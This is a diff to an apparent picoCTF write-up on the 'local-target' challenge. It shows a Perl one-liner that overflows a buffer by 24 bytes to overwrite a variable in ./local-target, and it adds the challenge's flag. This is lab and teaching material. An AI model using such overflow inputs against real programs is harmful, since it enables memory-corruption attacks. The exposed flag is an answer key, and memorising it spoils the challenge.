@@ -35,3 +35,5 @@ This tells us that the offset is 24, so we can send any 24 bytes, then for the 2
 We can send the following Perl command to overflow and overwrite the Num variable
 
 perl -e 'print "A" x 24 . "A"' | ./local-target
+Flag:
+picoCTF{l0c4l5_1n_5c0p3_ee58441a}
